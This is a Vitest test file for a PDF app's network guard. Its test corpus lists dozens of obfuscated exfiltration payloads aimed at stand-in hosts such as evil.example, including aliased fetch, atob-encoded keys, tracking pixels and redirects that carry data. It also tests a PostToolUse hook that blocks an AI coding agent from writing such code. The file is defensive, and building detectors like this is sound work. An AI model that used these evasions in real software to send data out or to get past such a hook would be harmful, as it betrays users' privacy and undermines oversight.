import { describe, expect, it } from 'vitest';
import { spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import * as guard from '../../scripts/network-guard.mjs';

/**
 * Audit 2026-09-25 PLT-6 — the zero-network analyzer shared by the
 * PostToolUse hook, `scripts/check-invariants.mjs` and the bundle scan.
 *
 * Every payload below got past the old line-regex guards (or is a close
 * variant of one that did). Each must be flagged; each negative case must not.
 */
const { analyzeNetwork } = guard as unknown as {
  analyzeNetwork: (
    text: string,
    rel: string,
    options?: { mode?: 'source' | 'bundle' }
  ) => { line: number; message: string }[];
};

const ROOT = path.resolve(__dirname, '../..');
const scan = (code: string, rel = 'src/core/payload.ts') => analyzeNetwork(code, rel);

// ---------------------------------------------------------------------------
// Payloads: [label, file, code]

const BYPASSES: [string, string, string][] = [
  // Aliased / computed / split network APIs
  ['aliased fetch', 'x.ts', `const f = fetch;\nf('https://evil.example/x');`],
  ['fetch passed as a value', 'x.ts', `run(fetch);`],
  ['fetch with ( on the next line', 'x.ts', `fetch\n  ('https://evil.example');`],
  ['globalThis computed concat key', 'x.ts', `globalThis['fe' + 'tch']('https://evil.example');`],
  ['window template key', 'x.ts', 'window[`fet${"ch"}`](u);'],
  ['self.fetch', 'x.ts', `self.fetch(u);`],
  ['aliased global object', 'x.ts', `const g = globalThis;\ng.fetch(u);`],
  ['document.defaultView.fetch', 'x.ts', `document.defaultView.fetch(u);`],
  ['atob-encoded key', 'x.ts', `globalThis[atob('ZmV0Y2g=')](u);`],
  ['array-join key', 'x.ts', `self[['fe', 'tch'].join('')](u);`],
  ['unresolvable key on window', 'x.ts', `const k = location.hash.slice(1);\nwindow[k](u);`],
  ['Reflect.apply(fetch)', 'x.ts', `Reflect.apply(fetch, null, ['https://evil.example']);`],
  ['Reflect.get(globalThis, key)', 'x.ts', `Reflect.get(globalThis, 'fe' + 'tch')(u);`],
  ['destructured from globalThis', 'x.ts', `const { fetch: go } = globalThis;\ngo(u);`],
  ['sendBeacon computed', 'x.ts', `navigator['sendBeacon']('https://t.example', data);`],
  ['sendBeacon aliased navigator', 'x.ts', `const n = navigator;\nn.sendBeacon(u, d);`],
  ['XMLHttpRequest', 'x.ts', `const x = new XMLHttpRequest();`],
  ['aliased WebSocket', 'x.ts', `const W = WebSocket;\nnew W('wss://evil.example');`],
  ['WebTransport', 'x.ts', `new WebTransport('https://evil.example');`],
  ['RTCPeerConnection', 'x.ts', `const pc = new RTCPeerConnection();`],
  ['EventSource', 'x.ts', `new EventSource('/stream');`],
  ['importScripts', 'x.ts', `importScripts('https://evil.example/lib.js');`],
  ['shadowing import', 'x.ts', `import { fetch } from './net';\nfetch(u);`],
  ['class extends WebSocket', 'x.ts', `class Sock extends WebSocket {}`],
  ['eval', 'x.ts', `eval('fet' + 'ch(u)');`],
  ['new Function', 'x.ts', `new Function('return fetch')()(u);`],
  // Code on a line starting with `*` (inside a template / expression)
  ['code on a `*` line', 'x.ts', `const n = 2\n  * fetch(u).length;`],
  [
    'template line starting with *',
    'x.ts',
    'const css = `\n* { background: url(https://evil.example/p.png) }`;'
  ],
  // Remote modules and workers
  ['dynamic import of https', 'x.ts', `await import('https://evil.example/m.js');`],
  ['dynamic import concat', 'x.ts', `await import('https:' + '//evil.example/m.js');`],
  ['dynamic import unresolvable', 'x.ts', `await import(location.hash.slice(1));`],
  ['static import of https', 'x.ts', `import x from 'https://evil.example/m.js';`],
  ['new Worker remote', 'x.ts', `new Worker('https://evil.example/w.js');`],
  ['new Worker variable', 'x.ts', `export function spawn(url: string) { return new Worker(url); }`],
  ['new SharedWorker protocol-relative', 'x.ts', `new SharedWorker('//evil.example/w.js');`],
  // URL sinks
  ['new Image().src', 'x.ts', `new Image().src = 'https://t.example/p.gif?' + id;`],
  [
    'createElement link href',
    'x.ts',
    `const l = document.createElement('link');\nl.href = 'https://fonts.example/f.css';`
  ],
  [
    'remote const into .src',
    'x.ts',
    `const PIXEL = \`https://t.example/\${id}\`;\nimg.src = PIXEL;`
  ],
  ['setAttribute src', 'x.ts', `el.setAttribute('src', 'https://evil.example/x.js');`],
  ['location.href', 'x.ts', `location.href = 'https://evil.example/?d=' + data;`],
  ['window.location =', 'x.ts', `window.location = 'https://evil.example';`],
  ['window.open', 'x.ts', `window.open('https://evil.example/?' + q);`],
  ['location.assign', 'x.ts', `location.assign('https://evil.example');`],
  ['location.replace', 'x.ts', `document.location.replace('//evil.example');`],
  ['backslash protocol-relative', 'x.ts', `img.src = '\\\\\\\\evil.example/p.gif';`],
  ['Object.assign src', 'x.ts', `Object.assign(new Image(), { src: 'https://t.example/p' });`],
  ['innerHTML img', 'x.ts', `el.innerHTML = '<img src="https://t.example/p.gif">';`],
  ['CSS-in-JS url()', 'x.ts', `el.style.backgroundImage = "url('https://t.example/p.png')";`],
  ['known CDN host in a string', 'x.ts', `const base = 'fonts.googleapis.com';`],
  // JSX
  ['JSX img src', 'x.tsx', `export const A = () => <img src="https://t.example/p.png" alt="" />;`],
  [
    'JSX iframe src expr',
    'x.tsx',
    `const U = 'https://evil.example';\nexport const A = () => <iframe src={U} />;`
  ],
  [
    'JSX style url()',
    'x.tsx',
    `export const A = () => <div style={{ background: 'url(https://t.example/p.png)' }} />;`
  ],
  // CSS
  ['CSS url()', 'x.css', `.a { background: url(https://t.example/p.png); }`],
  [
    'CSS quoted url() after comment',
    'x.css',
    `/* ok */ .a { background: url( "//t.example/p.png" ) }`
  ],
  ['CSS escaped url()', 'x.css', `.a { background: u\\72l(https://t.example/p.png) }`],
  ['CSS @import', 'x.css', `@import 'https://fonts.example/f.css';`],
  [
    'CSS @font-face',
    'x.css',
    `@font-face {\n  font-family: X;\n  src: url(https://fonts.example/x.woff2) format('woff2');\n}`
  ],
  ['CSS line starting with *', 'x.css', `.a {\n* background: url(https://t.example/p.png);\n}`],
  // HTML
  ['HTML img', 'x.html', `<img src="https://t.example/p.gif">`],
  ['HTML iframe', 'x.html', `<iframe src=https://evil.example></iframe>`],
  ['HTML remote script', 'x.html', `<script src="https://cdn.example/lib.js"></script>`],
  ['HTML remote stylesheet', 'x.html', `<link rel="stylesheet" href="https://cdn.example/a.css">`],
  ['HTML entity-encoded src', 'x.html', `<img src="&#104;ttps://t.example/p.gif">`],
  ['HTML inline script fetch', 'x.html', `<script type="module">\n  fetch('/x');\n</script>`],
  ['HTML inline style url()', 'x.html', `<style>.a{background:url(https://t.example/p)}</style>`],
  ['HTML style attribute', 'x.html', `<div style="background:url('https://t.example/p')"></div>`],
  ['HTML form action', 'x.html', `<form action="https://evil.example/collect"></form>`],
  ['HTML srcset', 'x.html', `<img srcset="a.png 1x, https://t.example/b.png 2x">`],
  [
    'HTML meta refresh',
    'x.html',
    `<meta http-equiv="refresh" content="0; url=https://evil.example">`
  ]
];

describe('network guard — bypass payloads are flagged', () => {
  for (const [label, file, code] of BYPASSES) {
    it(label, () => {
      const findings = scan(code, `src/core/${file}`);
      expect(findings, `not flagged:\n${code}`).not.toEqual([]);
    });
  }

  it('reports the line of the offending code', () => {
    const findings = scan(`const a = 1;\nconst b = 2;\nconst f = fetch;\n`);
    expect(findings.map(f => f.line)).toEqual([3]);
  });

  it('reports lines inside inline <script> and <style> relative to the file', () => {
    const findings = scan(
      `<!doctype html>\n<p>x</p>\n<script>\n  const a = 1;\n  fetch('/x');\n</script>\n<style>\n.a{}\n.b{background:url(https://t.example)}\n</style>`,
      'editor.html'
    );
    expect(findings.map(f => f.line)).toEqual([5, 9]);
  });

  it('devanagariFont.ts may fetch only a same-origin target', () => {
    const rel = 'src/core/ocr/devanagariFont.ts';
    expect(
      scan(
        `const FONT_URL = new URL('./assets/f.ttf', import.meta.url).href;\nawait fetch(FONT_URL);`,
        rel
      )
    ).toEqual([]);
    expect(scan(`await fetch('https://evil.example/f.ttf');`, rel)).not.toEqual([]);
    expect(scan(`await fetch(url);`, rel)).not.toEqual([]);
    expect(scan(`const f = fetch;`, rel)).not.toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Negative cases

const CLEAN: [string, string, string][] = [
  [
    'relative import',
    'x.ts',
    `import { a } from './a';\nimport b from '../b';\nexport * from './c';`
  ],
  [
    'bare package import',
    'x.ts',
    `import { PDFDocument } from 'pdf-lib';\nconst m = await import('fontkit');`
  ],
  [
    'dynamic import with relative template',
    'x.ts',
    'const d = await import(`./locales/${lang}.json`);'
  ],
  [
    'bundled worker',
    'x.ts',
    `new Worker(new URL('./render.worker.ts', import.meta.url), { type: 'module' });`
  ],
  [
    'same-origin URL into .src',
    'x.ts',
    `img.src = URL.createObjectURL(blob);\nimg.src = '/icons/a.png';\nimg.src = './a.png';`
  ],
  ['blob / data URL into .href', 'x.ts', `a.href = 'data:text/plain,hi';\na.download = 'x.txt';`],
  [
    'comments are not code',
    'x.ts',
    `// fetch('https://evil.example')\n/* new WebSocket('wss://x') */\n/**\n * fetch(u)\n */\nexport const a = 1;`
  ],
  [
    'a property named fetch',
    'x.ts',
    `const env = { fetch: refuse, readFile: refuse };\nexport default env;`
  ],
  ['a method named fetch on another object', 'x.ts', `cache.fetch(key);`],
  [
    'type-only reference',
    'x.ts',
    `type F = typeof fetch;\nlet r: ReturnType<typeof fetch> | undefined;`
  ],
  ['feature detection with in', 'x.ts', `const ok = 'showSaveFilePicker' in window;`],
  [
    'xmlns / namespace URIs',
    'x.ts',
    `const xml = '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Relationship Type="http://schemas.openxmlformats.org/x" Target="xl/workbook.xml"/></Types>';`
  ],
  [
    'SVG namespace',
    'x.tsx',
    `export const I = () => <svg xmlns="http://www.w3.org/2000/svg"><use href="#i" /></svg>;`
  ],
  [
    'repository link in <a href>',
    'x.tsx',
    `const REPO = 'https://github.com/stapler-pdf/stapler';\nexport const L = () => <a href={REPO} target="_blank" rel="noreferrer">Source</a>;`
  ],
  [
    'URL as fixture data (non-sink)',
    'x.ts',
    `const cases = [{ input: 'https://example.com/a.pdf', expected: 'a.pdf' }];\nexport default cases;`
  ],
  [
    'URL passed to a plain function',
    'x.ts',
    `const name = fileNameFromUrl('https://example.com/a.pdf');`
  ],
  ['string with url( but local', 'x.ts', `el.style.backgroundImage = \`url(\${blobUrl})\`;`],
  ['window.open of a blob', 'x.ts', `window.open(URL.createObjectURL(blob), '_blank');`],
  ['canonical link', 'x.html', `<link rel="canonical" href="https://stapler.app/merge-pdf" />`],
  ['anchor to a remote page', 'x.html', `<a href="https://github.com/x/y/issues">issues</a>`],
  [
    'JSON-LD data block',
    'x.html',
    `<script type="application/ld+json">{"url":"https://stapler.app"}</script>`
  ],
  ['HTML comment', 'x.html', `<!-- <img src="https://t.example/p.gif"> -->`],
  [
    'CSS comment',
    'x.css',
    `/* background: url(https://t.example/p.png) */\n.a { background: url(./p.png) }`
  ],
  ['CSS @namespace', 'x.css', `@namespace svg url(http://www.w3.org/2000/svg);`],
  [
    'CSS data url',
    'x.css',
    `.a { background: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>") }`
  ],
  [
    'local binding named self',
    'x.ts',
    `function f(self: { k: string }) { return self[String(Math.random())]; }`
  ]
];

describe('network guard — clean code is not flagged', () => {
  for (const [label, file, code] of CLEAN) {
    it(label, () => {
      expect(scan(code, `src/core/${file}`)).toEqual([]);
    });
  }

  it('skips the OCR model download files entirely (the one exception)', () => {
    const code = `export const U = 'https://cdn.jsdelivr.net/npm/x/';\nawait fetch(U);`;
    expect(scan(code, 'src/core/ocr/model.ts')).toEqual([]);
    expect(scan(code, 'src/core/ocr/download.ts')).toEqual([]);
    expect(scan(code, 'src/core/ocr/runOcr.ts')).not.toEqual([]);
  });

  it('bundle mode ignores library fetch references but still flags remote sinks', () => {
    const lib = `function load(u){ return fetch(u) }\nconst x = new XMLHttpRequest();`;
    expect(analyzeNetwork(lib, 'dist/ext/assets/lib.js', { mode: 'bundle' })).toEqual([]);
    expect(
      analyzeNetwork(`img.src = "https://t.example/p.gif";`, 'dist/ext/assets/lib.js', {
        mode: 'bundle'
      })
    ).not.toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Post-build bundle scan

describe('bundle network scan', () => {
  it('passes inert URLs and fails unlisted hosts and remote sinks', async () => {
    const { scanBundle } = (await import('../../scripts/check-bundle-network.mjs')) as unknown as {
      scanBundle: (dirs: string[], options?: { root?: string }) => { failures: string[] };
    };
    const dir = mkdtempSync(path.join(tmpdir(), 'stapler-bundle-'));
    try {
      const at = (name: string, code: string) => {
        const sub = path.join(dir, name);
        mkdirSync(sub, { recursive: true });
        writeFileSync(path.join(sub, 'a.js'), code);
        return scanBundle([sub], { root: dir }).failures;
      };
      expect(
        at(
          'clean',
          `const NS="http://www.w3.org/2000/svg";/*! see https://github.com/x/y */function f(u){return fetch(u)}`
        )
      ).toEqual([]);
      expect(at('host', `throw Error("see https://tracker.example/x")`)).not.toEqual([]);
      // The sink check fails even for a host the inventory would accept.
      expect(at('sink', `new Image().src="https://github.com/p.gif"`)).not.toEqual([]);
      expect(at('css', `el.style.cssText="background:url(//cdn.example/p.png)"`)).not.toEqual([]);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// The real repository and the real hook

describe('network guard — this repository', () => {
  it('the shipped entry pages and the network-API files are clean', () => {
    for (const rel of [
      'editor.html',
      'merge-pdf.html',
      'public/privacy.html',
      'src/core/ocr/devanagariFont.ts',
      'src/core/workers/index.ts',
      'src/ui/components/TrustModal.tsx',
      'src/core/convert/xlsx-writer.ts'
    ]) {
      expect(analyzeNetwork(readFileSync(path.join(ROOT, rel), 'utf8'), rel), rel).toEqual([]);
    }
  });

  it('the PostToolUse hook blocks a bypass payload and passes a clean file', () => {
    const dir = mkdtempSync(path.join(tmpdir(), 'stapler-hook-'));
    try {
      // The hook resolves paths against its cwd, so the payload lives under
      // src/ of a throwaway project root that runs this repo's hook.
      mkdirSync(path.join(dir, 'src/core'), { recursive: true });
      const run = (rel: string, code: string) => {
        const file = path.join(dir, rel);
        writeFileSync(file, code);
        return spawnSync(
          process.execPath,
          [path.join(ROOT, '.claude/hooks/check-invariants.mjs')],
          {
            cwd: dir,
            input: JSON.stringify({ tool_input: { file_path: file } }),
            encoding: 'utf8'
          }
        );
      };
      const bad = run(
        'src/core/__plt6_payload__.ts',
        `const g = globalThis;\ng['fe' + 'tch']('https://x.example');\n`
      );
      expect(bad.status).toBe(0);
      expect(JSON.parse(bad.stdout).decision).toBe('block');
      const good = run(
        'src/core/__plt6_clean__.ts',
        `export const x = new URL('./a', import.meta.url).href;\n`
      );
      expect(good.status).toBe(0);
      expect(good.stdout).toBe('');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
